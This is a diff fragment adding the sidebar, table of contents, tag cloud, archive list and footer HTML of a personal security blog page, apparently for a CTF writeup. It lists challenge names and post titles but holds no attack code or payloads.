+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        Posts
+                    </p>
+                    <a href="/archives">
+                        <p class="title has-text-weight-normal">
+                            23
+                        </p>
+                    </a>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        Categories
+                    </p>
+                    <a href="/categories">
+                        <p class="title has-text-weight-normal">
+                            8
+                        </p>
+                    </a>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        Tags
+                    </p>
+                    <a href="/tags">
+                        <p class="title has-text-weight-normal">
+                            37
+                        </p>
+                    </a>
+                </div>
+            </div>
+        </nav>
+        
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://github.com/oalieno" target="_blank" rel="noopener" style="border-radius: 3px">
+                Follow</a>
+        </div>
+        
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="Github" href="https://github.com/oalieno">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="Ig" href="https://www.instagram.com/oalieno">
+                
+                <i class="fab fa-ig"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="In" href="https://www.linkedin.com/in/oalieno/">
+                
+                <i class="fab fa-linkedin"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        
+
+    <div class="card widget" id="toc">
+        <div class="card-content">
+            <div class="menu">
+                <h3 class="menu-label">
+                    Catalogue
+                </h3>
+                <ul class="menu-list"><li>
+        <a class="is-flex" href="#Misc">
+        <span class="has-mr-6">1</span>
+        <span>Misc</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#Piquero">
+        <span class="has-mr-6">1.1</span>
+        <span>Piquero</span>
+        </a></li><li>
+        <a class="is-flex" href="#Karuego">
+        <span class="has-mr-6">1.2</span>
+        <span>Karuego</span>
+        </a></li><li>
+        <a class="is-flex" href="#Soy">
+        <span class="has-mr-6">1.3</span>
+        <span>Soy</span>
+        </a></li><li>
+        <a class="is-flex" href="#Saburo">
+        <span class="has-mr-6">1.4</span>
+        <span>Saburo</span>
+        </a></li><li>
+        <a class="is-flex" href="#Shichirou">
+        <span class="has-mr-6">1.5</span>
+        <span>Shichirou</span>
+        </a></li><li>
+        <a class="is-flex" href="#Clara">
+        <span class="has-mr-6">1.6</span>
+        <span>Clara</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#Reverse">
+        <span class="has-mr-6">2</span>
+        <span>Reverse</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#TsaiBro">
+        <span class="has-mr-6">2.1</span>
+        <span>TsaiBro</span>
+        </a></li><li>
+        <a class="is-flex" href="#Fallen-Beat">
+        <span class="has-mr-6">2.2</span>
+        <span>Fallen Beat</span>
+        </a></li><li>
+        <a class="is-flex" href="#Stand-up-Brain">
+        <span class="has-mr-6">2.3</span>
+        <span>Stand up!Brain</span>
+        </a></li><li>
+        <a class="is-flex" href="#Long-Island-Iced-Tea">
+        <span class="has-mr-6">2.4</span>
+        <span>Long Island Iced Tea</span>
+        </a></li><li>
+        <a class="is-flex" href="#La-vie-en-rose">
+        <span class="has-mr-6">2.5</span>
+        <span>La vie en rose</span>
+        </a></li><li>
+        <a class="is-flex" href="#Uroboros">
+        <span class="has-mr-6">2.6</span>
+        <span>Uroboros</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#Pwn">
+        <span class="has-mr-6">3</span>
+        <span>Pwn</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#BOF">
+        <span class="has-mr-6">3.1</span>
+        <span>BOF</span>
+        </a></li><li>
+        <a class="is-flex" href="#Nonsense">
+        <span class="has-mr-6">3.2</span>
+        <span>Nonsense</span>
+        </a></li><li>
+        <a class="is-flex" href="#Portal-Gun">
+        <span class="has-mr-6">3.3</span>
+        <span>Portal Gun</span>
+        </a></li><li>
+        <a class="is-flex" href="#Morty-School">
+        <span class="has-mr-6">3.4</span>
+        <span>Morty School</span>
+        </a></li><li>
+        <a class="is-flex" href="#Death-Crystal">
+        <span class="has-mr-6">3.5</span>
+        <span>Death Crystal</span>
+        </a></li><li>
+        <a class="is-flex" href="#Meeseeks-Box">
+        <span class="has-mr-6">3.6</span>
+        <span>Meeseeks Box</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#Crypto">
+        <span class="has-mr-6">4</span>
+        <span>Crypto</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#Brontosaurus">
+        <span class="has-mr-6">4.1</span>
+        <span>Brontosaurus</span>
+        </a></li><li>
+        <a class="is-flex" href="#T-Rex">
+        <span class="has-mr-6">4.2</span>
+        <span>T-Rex</span>
+        </a></li><li>
+        <a class="is-flex" href="#Octopus">
+        <span class="has-mr-6">4.3</span>
+        <span>Octopus</span>
+        </a></li><li>
+        <a class="is-flex" href="#Blowfish">
+        <span class="has-mr-6">4.4</span>
+        <span>Blowfish</span>
+        </a></li><li>
+        <a class="is-flex" href="#Camel">
+        <span class="has-mr-6">4.5</span>
+        <span>Camel</span>
+        </a></li><li>
+        <a class="is-flex" href="#Turtle">
+        <span class="has-mr-6">4.6</span>
+        <span>Turtle</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#Web">
+        <span class="has-mr-6">5</span>
+        <span>Web</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#Squirrel">
+        <span class="has-mr-6">5.1</span>
+        <span>Squirrel</span>
+        </a></li><li>
+        <a class="is-flex" href="#Shark">
+        <span class="has-mr-6">5.2</span>
+        <span>Shark</span>
+        </a></li><li>
+        <a class="is-flex" href="#Elephant">
+        <span class="has-mr-6">5.3</span>
+        <span>Elephant</span>
+        </a></li><li>
+        <a class="is-flex" href="#Snake">
+        <span class="has-mr-6">5.4</span>
+        <span>Snake</span>
+        </a></li><li>
+        <a class="is-flex" href="#Owl">
+        <span class="has-mr-6">5.5</span>
+        <span>Owl</span>
+        </a></li><li>
+        <a class="is-flex" href="#Rhino">
+        <span class="has-mr-6">5.6</span>
+        <span>Rhino</span>
+        </a></li></ul></li></ul>
+            </div>
+        </div>
+    </div>
+
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                Categories
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/algorithm/">
+            <span class="level-start">
+                <span class="level-item">algorithm</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/security/">
+            <span class="level-start">
+                <span class="level-item">security</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">14</span>
+            </span>
+        </a><ul><li>
+        <a class="level is-marginless" href="/categories/security/crypto/">
+            <span class="level-start">
+                <span class="level-item">crypto</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/security/news/">
+            <span class="level-start">
+                <span class="level-item">news</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/security/osint/">
+            <span class="level-start">
+                <span class="level-item">osint</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/security/pwn/">
+            <span class="level-start">
+                <span class="level-item">pwn</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">3</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/security/reverse/">
+            <span class="level-start">
+                <span class="level-item">reverse</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">3</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/security/writeups/">
+            <span class="level-start">
+                <span class="level-item">writeups</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">5</span>
+            </span>
+        </a></li></ul></li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            Tag Cloud
+        </h3>
+        <a href="/tags/LINE-TAXI/" style="font-size: 10px;">LINE TAXI</a> <a href="/tags/adb/" style="font-size: 10px;">adb</a> <a href="/tags/algorithm/" style="font-size: 10px;">algorithm</a> <a href="/tags/android/" style="font-size: 13.33px;">android</a> <a href="/tags/blockchain/" style="font-size: 10px;">blockchain</a> <a href="/tags/burp/" style="font-size: 10px;">burp</a> <a href="/tags/crypto/" style="font-size: 11.67px;">crypto</a> <a href="/tags/ctf/" style="font-size: 18.33px;">ctf</a> <a href="/tags/drony/" style="font-size: 10px;">drony</a> <a href="/tags/frida/" style="font-size: 11.67px;">frida</a> <a href="/tags/gdb/" style="font-size: 10px;">gdb</a> <a href="/tags/hexo/" style="font-size: 13.33px;">hexo</a> <a href="/tags/icarus/" style="font-size: 13.33px;">icarus</a> <a href="/tags/iterm2/" style="font-size: 10px;">iterm2</a> <a href="/tags/kernel/" style="font-size: 10px;">kernel</a> <a href="/tags/knapsack/" style="font-size: 10px;">knapsack</a> <a href="/tags/lattice/" style="font-size: 10px;">lattice</a> <a href="/tags/netflix/" style="font-size: 10px;">netflix</a> <a href="/tags/news/" style="font-size: 10px;">news</a> <a href="/tags/nord/" style="font-size: 10px;">nord</a> <a href="/tags/nox/" style="font-size: 10px;">nox</a> <a href="/tags/osint/" style="font-size: 10px;">osint</a> <a href="/tags/powerlevel10k/" style="font-size: 10px;">powerlevel10k</a> <a href="/tags/powerlevel9k/" style="font-size: 10px;">powerlevel9k</a> <a href="/tags/pwn/" style="font-size: 15px;">pwn</a> <a href="/tags/pyc/" style="font-size: 10px;">pyc</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/reverse/" style="font-size: 15px;">reverse</a> <a href="/tags/rootkit/" style="font-size: 10px;">rootkit</a> <a href="/tags/rsa/" style="font-size: 10px;">rsa</a> <a href="/tags/security/" style="font-size: 20px;">security</a> <a href="/tags/seo/" style="font-size: 10px;">seo</a> <a href="/tags/srop/" style="font-size: 10px;">srop</a> <a href="/tags/subset-sum/" style="font-size: 10px;">subset-sum</a> <a href="/tags/writeups/" style="font-size: 16.67px;">writeups</a> <a href="/tags/zimfw/" style="font-size: 10px;">zimfw</a> <a href="/tags/zsh/" style="font-size: 10px;">zsh</a>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            Recent
+        </h3>
+        
+        <article class="media">
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-08-16T08:24:04.000Z">2020-08-16</time></div>
+                    <a href="/2020/08/16/security/news/clipboard-hijack/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Clipboard hijacking cryptocurrency malware on tradingview.com</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/news/">news</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-07-30T16:29:25.000Z">2020-07-31</time></div>
+                    <a href="/2020/07/31/security/osint/maltego/" class="title has-link-black-ter is-size-6 has-text-weight-normal">[小工具] Maltego</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/osint/">osint</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-06-09T14:29:00.000Z">2020-06-09</time></div>
+                    <a href="/2020/06/09/security/writeups/ais3-2020-preexam/" class="title has-link-black-ter is-size-6 has-text-weight-normal">[Writeups] AIS3 pre-exam 2020</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/writeups/">writeups</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-05-04T06:33:13.000Z">2020-05-04</time></div>
+                    <a href="/2020/05/04/security/writeups/f-hash/" class="title has-link-black-ter is-size-6 has-text-weight-normal">[Writeups] VolgaCTF Quals 2020 - F-Hash</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/writeups/">writeups</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-20T13:11:11.000Z">2020-03-20</time></div>
+                    <a href="/2020/03/20/security/crypto/knapsack-crypto/" class="title has-link-black-ter is-size-6 has-text-weight-normal">[後量子密碼] Knapsack Cryptosystem and Subset-Sum Problem</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/crypto/">crypto</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            Archives
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/08/">
+                <span class="level-start">
+                    <span class="level-item">August 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/07/">
+                <span class="level-start">
+                    <span class="level-item">July 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/06/">
+                <span class="level-start">
+                    <span class="level-item">June 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/05/">
+                <span class="level-start">
+                    <span class="level-item">May 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/03/">
+                <span class="level-start">
+                    <span class="level-item">March 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/02/">
+                <span class="level-start">
+                    <span class="level-item">February 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/01/">
+                <span class="level-start">
+                    <span class="level-item">January 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/09/">
+                <span class="level-start">
+                    <span class="level-item">September 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/06/">
+                <span class="level-start">
+                    <span class="level-item">June 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/05/">
+                <span class="level-start">
+                    <span class="level-item">May 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/04/">
+                <span class="level-start">
+                    <span class="level-item">April 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/03/">
+                <span class="level-start">
+                    <span class="level-item">March 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/11/">
+                <span class="level-start">
+                    <span class="level-item">November 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen ">
+        
+        </div>
+    
+</div>
+
+                
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    oalieno blog
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2020 oalieno&nbsp;
+                Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a>
+                
+                <br>
+                <span id="busuanzi_container_site_uv">
+                Visited by <span id="busuanzi_value_site_uv">0</span> users
+                </span>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/oalieno/oalieno.github.io">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("en");</script>
+
+
+<script>
+var IcarusThemeSettings = {
+    site: {
+        url: 'https://oalieno.github.io',
+        external_link: {"enable":true,"exclude":[]}
+    },
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    },
+    github: {
+        url: 'https://github.com/oalieno/oalieno.github.io'
+    }
+};
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+
+
+<script src="/js/animation.js"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+<script src="/js/gallery.js" defer></script>
+
+
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+
+
+<a id="bottom-to-top" title="plugin.bottomtotop" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/bottom-to-top.js" defer></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="/js/main.js" defer></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.2.0/lazysizes.min.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
